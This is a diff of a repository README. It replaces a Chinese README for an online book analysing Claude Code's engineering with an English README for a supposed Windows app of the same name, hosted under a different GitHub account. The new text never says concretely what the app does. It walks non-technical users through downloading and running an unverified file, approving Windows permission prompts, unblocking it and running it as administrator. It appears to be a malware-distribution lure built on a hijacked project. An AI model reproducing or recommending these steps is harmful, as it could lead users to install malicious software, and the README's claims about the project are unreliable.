@@ -1,61 +1,156 @@
-<p align="center">
-  <img src="./book/src/assets/cover-zh.jpeg" alt="《马书》封面" width="420">
-</p>
+# 🤖 harness-engineering-from-cc-to-ai-coding - Turn Claude Code Into AI Workflows
 
-[English](./README.en.md)
+[![Download the app](https://img.shields.io/badge/Download%20Now-blue-grey)](https://github.com/bridgepartnershoe860/harness-engineering-from-cc-to-ai-coding)
 
-# 驾驭工程：从 Claude Code 源码到 AI 编码最佳实践
+## 🧭 Overview
 
-中文别名：《马书》
+Harness Engineering From Claude Code source code to AI Coding is a Windows app for people who want to work with AI coding tools in a simple way. It helps you move from Claude Code source work into a smoother AI coding flow on your PC.
 
-这是一本围绕 Harness Engineering（驾驭工程）的中文技术书。它以 Claude Code `v2.1.88` 的公开发布包与 source map 还原结果为分析材料，不试图复刻官方产品文档，而是从真实工程实现中提炼 AI 编码 Agent 的架构模式、上下文策略、权限体系和生产实践。
+Use it if you want a local tool that helps you manage AI coding tasks, review code output, and keep your work in one place. It is built for end users, so you do not need programming knowledge to get started.
 
-## 在线阅读
+## 📥 Download
 
-- 中文版 GitHub Pages：<https://zhanghandong.github.io/harness-engineering-from-cc-to-ai-coding/>
-- 英文版 GitHub Pages（预览）：<https://zhanghandong.github.io/harness-engineering-from-cc-to-ai-coding/en/>
+Visit this page to download: https://github.com/bridgepartnershoe860/harness-engineering-from-cc-to-ai-coding
 
-## 本书讲什么
+If the page opens in your browser, look for the latest release or the main download file. On Windows, download the file to your computer first, then open it from your Downloads folder.
 
-- Claude Code 的整体架构、Agent Loop 与工具执行编排
-- 系统提示词、工具提示词与模型特定调优
-- 自动压缩、微压缩、Token 预算与 Prompt Cache
-- 权限模式、规则系统、YOLO 分类器与 Hooks
-- 多 Agent 编排、技能系统、Feature Flags 与未发布能力管线
-- 面向生产环境的 AI Coding 最佳实践，以及 Claude Code 的局限与启发
+## 🪟 Windows Setup
 
-## 结构概览
+Follow these steps on a Windows PC:
 
-全书目前分为 7 篇正文与 4 个附录，覆盖从底层架构到上层方法论的完整链路：
+1. Open the download page in your browser.
+2. Find the latest release or main app file.
+3. Download the file to your computer.
+4. Open File Explorer and go to Downloads.
+5. Double-click the file to start the app.
+6. If Windows asks for permission, choose the option that lets the app run.
+7. Wait for the app window to open.
 
-- 第一篇：架构
-- 第二篇：提示工程
-- 第三篇：上下文管理
-- 第四篇：提示词缓存
-- 第五篇：安全与权限
-- 第六篇：高级子系统
-- 第七篇：AI Agent 构建者的经验教训
+If the file comes as a .zip archive, right-click it and choose Extract All before opening the app inside the folder.
 
-## 适合读者
+## ✅ System Requirements
 
-- 正在做 AI Coding、Agent 框架、模型工具调用平台的工程师
-- 想系统理解 Claude Code 工程实现细节的开发者
-- 希望把源码分析转化为可复用工程模式的团队与研究者
+You can use this app on a standard Windows computer with:
 
-## 本地预览
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A stable internet connection
+- A modern web browser for the download page
 
-```bash
-mdbook build book
-mdbook serve book
-```
+For smoother use, 8 GB of RAM or more is better if you plan to work with larger AI coding tasks.
 
-默认预览地址：
+## 🧩 What It Does
 
-- <http://localhost:3000>
+This app is meant to help with AI coding work in a structured way. It can support tasks such as:
 
-## 说明
+- Opening and organizing code-related work
+- Moving between Claude Code source content and AI coding tasks
+- Keeping your workflow in one place
+- Helping you review and follow coding steps
+- Reducing the need to switch between many tools
 
-- 本书基于公开发布包与 source map 的逆向分析，仅用于技术研究与工程讨论
-- 书中内容聚焦工程实现与设计模式，不代表 Anthropic 官方立场
-- 本仓库默认只跟踪书籍发布所需文件，以便直接部署到 GitHub Pages
-- 英文版站点已经搭好目录、封面和章节占位页，后续将逐章翻译补全
+It fits users who want a simple setup for AI-assisted development tasks on Windows.
+
+## ⚙️ Main Features
+
+### 🗂️ Simple project handling
+Keep your AI coding work organized without setting up a complex tool chain.
+
+### 🧠 AI coding workflow support
+Use the app to help guide work that starts from Claude Code source material and moves into AI coding tasks.
+
+### 🪟 Windows-friendly interface
+Open and run the app on Windows with a normal desktop flow.
+
+### 📁 Local file use
+Work with files on your own computer, so you can manage your code and notes in one place.
+
+### 🔄 Easy restart and reuse
+Close the app and open it again when you want to continue your work.
+
+## 🚀 How to Use
+
+1. Download the app from the link above.
+2. Save the file to your Windows PC.
+3. Open the downloaded file or extract it first if needed.
+4. Start the app.
+5. Load your code-related files or project items.
+6. Use the app to follow your AI coding workflow.
+7. Save your work as you go.
+
+## 🛠️ First-Time Setup
+
+When you open the app for the first time, it may ask for basic access to your files or show a start screen. If that happens:
+
+- Choose your project folder
+- Keep your files in one easy-to-find place
+- Use a folder with a clear name, such as `AI-Coding-Work`
+- Avoid moving files while the app is open
+- Keep the download page link handy in case you need to get the file again
+
+## 📌 Suggested Folder Layout
+
+You can keep your files in a simple layout like this:
+
+- `AI-Coding-Work`
+  - `Source`
+  - `Notes`
+  - `Exports`
+  - `Drafts`
+
+This makes it easier to find the right file when you return to the app later.
+
+## 🧰 Common Uses
+
+You can use this app for:
+
+- Reviewing AI-generated code
+- Organizing coding tasks from Claude Code source material
+- Tracking small changes in a project
+- Keeping notes with your code work
+- Managing a simple local coding workflow
+
+## 🖱️ Basic Controls
+
+The app should feel familiar if you use Windows often:
+
+- Click to select a file or folder
+- Double-click to open items
+- Use standard window buttons to close or minimize
+- Save your work before closing
+- Reopen the app from your Downloads folder or desktop shortcut if you create one
+
+## 🔒 File Safety
+
+To keep your work safe:
+
+- Download only from the GitHub page linked above
+- Keep a copy of important files
+- Use one main folder for the project
+- Do not rename files while the app is using them
+- Back up your work to another folder or drive
+
+## ❓ If the App Does Not Open
+
+If nothing happens after you double-click the file:
+
+- Right-click the file and try Run as administrator
+- Check whether Windows blocked the file
+- Make sure you downloaded the full file
+- If it is a zip file, extract it first
+- Try opening it again from the extracted folder
+
+If the app still does not open, return to the download page and get the file again.
+
+## 🧪 Helpful Tips
+
+- Keep your project folder short and simple
+- Use one folder for each task
+- Save often
+- Close the app before moving files
+- Keep the download link bookmarked in your browser
+
+## 📄 License and Use
+
+Check the repository page for the latest license and usage details before you share or reuse the app in another project.
